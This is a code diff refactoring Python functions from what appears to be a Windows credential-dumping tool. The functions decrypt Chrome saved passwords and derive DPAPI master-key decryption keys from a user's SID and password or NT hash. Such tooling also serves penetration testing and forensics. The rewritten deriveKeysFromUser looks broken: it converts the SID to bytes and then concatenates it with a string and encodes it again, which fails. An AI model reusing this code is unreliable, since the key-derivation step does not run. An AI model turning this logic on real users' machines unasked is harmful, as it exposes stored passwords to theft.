@@ -232,36 +232,35 @@ def pvkblob_to_pkcs1(key):
     return r
 
 def decrypt_chrome_password(encrypted_password: str, aeskey: bytes):
-    if encrypted_password[:3]==b'v10' or encrypted_password[:3]==b'v11':
-        iv = encrypted_password[3:3 + 12]
-        payload = encrypted_password[15:]
+    version, rest = encrypted_password[:3], encrypted_password[3:]
+    if version in (b'v10', b'v11'):
+        iv, payload = rest[:12], rest[12:]
         cipher = AES.new(aeskey, AES.MODE_GCM, iv)
         decrypted = cipher.decrypt(payload)[:-16]
         decrypted = decrypted.decode('utf-8')
-        if decrypted != None:
-            return decrypted
-        else:
-            return None
+        return decrypted or None
 
 def deriveKeysFromUser(sid, password):
+    password = password.encode('utf-16le')
+    sid = sid.encode('utf-16le')
+    z_sid = (sid + '\0').encode('utf-16le')
+    password_md4 = MD4.new(password).digest()
     # Will generate two keys, one with SHA1 and another with MD4
-    key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
-    key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
+    key1 = HMAC.new(SHA1.new(password).digest(), z_sid, SHA1).digest()
+    key2 = HMAC.new(password_md4, z_sid, SHA1).digest()
     # For Protected users
-    tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
-    tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
-    key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
+    tmpKey = pbkdf2_hmac('sha256', password_md4, sid, 10000)
+    tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid, 1)[:16]
+    key3 = HMAC.new(tmpKey2, z_sid, SHA1).digest()[:20]
 
     return key1, key2, key3
 
 def deriveKeysFromUserkey(sid, nthash):
-    key1 = key2 = None
-    if len(nthash) == 20:
-        # SHA1
-        key1 = HMAC.new(nthash, (sid + '\0').encode('utf-16le'), SHA1).digest()
-    else:
+    key1 = HMAC.new(nthash, (sid + '\0').encode('utf-16le'), SHA1).digest() # SHA1
+    key2 = None
+
+    if len(nthash) != 20:
         # Assume MD4
-        key1 = HMAC.new(nthash, (sid + '\0').encode('utf-16le'), SHA1).digest()
         # For Protected users
         tmpKey = pbkdf2_hmac('sha256', nthash, sid.encode('utf-16le'), 10000)
         tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
